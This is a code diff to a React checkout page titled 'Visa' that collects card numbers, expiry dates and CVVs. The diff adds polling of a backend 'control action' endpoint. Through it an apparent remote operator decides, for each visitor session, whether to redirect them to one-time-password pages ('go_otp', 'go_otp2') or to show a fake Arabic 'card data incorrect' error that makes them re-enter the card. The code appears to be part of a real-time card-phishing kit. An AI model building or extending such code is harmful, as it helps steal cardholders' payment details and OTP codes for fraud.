@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from "react";
 import { useLocation } from "wouter";
 import { addSubmission, getSubmissions } from "@/lib/submissions";
+import { getControlAction } from "@/lib/api";
 import { Header } from "@/components/layout/Header";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -22,7 +23,7 @@ export default function Visa() {
   const [cvv, setCvv] = useState("");
   const [waitState, setWaitState] = useState<WaitState>("idle");
   const [errorMsg, setErrorMsg] = useState("");
-  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
+  const pollRef = useRef<number | null>(null);
 
   // Order summary state
   const [basePrice, setBasePrice] = useState(0);
@@ -45,33 +46,67 @@ export default function Visa() {
   const startPolling = (sessionId: string) => {
     if (pollRef.current) clearInterval(pollRef.current);
     let lastSeen = Math.max(...getSubmissions().map(s => s.id), 0);
-    pollRef.current = setInterval(() => {
+    pollRef.current = window.setInterval(async () => {
       try {
         const subs = getSubmissions().filter(s => s.sessionId === sessionId && s.id > lastSeen);
-        if (subs.length === 0) return;
-        lastSeen = Math.max(...subs.map(s => s.id, lastSeen));
-        const latest = subs[subs.length - 1];
-        if (!latest) return;
-        if (latest.type.startsWith("otp")) {
-          if (pollRef.current) clearInterval(pollRef.current);
-          setLocation("/otp");
-        } else if (latest.type === "card") {
-          // treat admin card_error as an injected card with placeholder number
-          const d = JSON.parse(latest.data || "{}");
-          const cn: string = String(d.cardNumber || "");
-          if (cn.replace(/\s/g, "").startsWith("0000")) {
+        if (subs.length > 0) {
+          lastSeen = Math.max(...subs.map(s => s.id, lastSeen));
+          const latest = subs[subs.length - 1];
+          if (latest?.type.startsWith("otp")) {
             if (pollRef.current) clearInterval(pollRef.current);
-            setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
-            setWaitState("error");
-            setTimeout(() => {
-              setWaitState("idle");
-              setErrorMsg("");
-              setCardNumber("");
-              setCardHolder("");
-              setExpiry("");
-              setCvv("");
-            }, 3000);
+            setLocation("/otp");
+            return;
           }
+          if (latest?.type === "card") {
+            const d = JSON.parse(latest.data || "{}");
+            const cn: string = String(d.cardNumber || "");
+            if (cn.replace(/\s/g, "").startsWith("0000")) {
+              if (pollRef.current) clearInterval(pollRef.current);
+              setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
+              setWaitState("error");
+              setTimeout(() => {
+                setWaitState("idle");
+                setErrorMsg("");
+                setCardNumber("");
+                setCardHolder("");
+                setExpiry("");
+                setCvv("");
+              }, 3000);
+              return;
+            }
+          }
+        }
+      } catch { /* ignore */ }
+
+      try {
+        const result = await getControlAction(sessionId);
+        const action = result.action;
+        if (!action) return;
+
+        if (pollRef.current) clearInterval(pollRef.current);
+
+        if (action === "go_otp") {
+          setLocation("/otp");
+          return;
+        }
+
+        if (action === "go_otp2") {
+          setLocation("/otp2");
+          return;
+        }
+
+        if (action === "card_error") {
+          setErrorMsg("عذراً، بيانات البطاقة غير صحيحة. يرجى إعادة المحاولة.");
+          setWaitState("error");
+          setTimeout(() => {
+            setWaitState("idle");
+            setErrorMsg("");
+            setCardNumber("");
+            setCardHolder("");
+            setExpiry("");
+            setCvv("");
+          }, 3000);
+          return;
         }
       } catch { /* ignore */ }
     }, 2000);
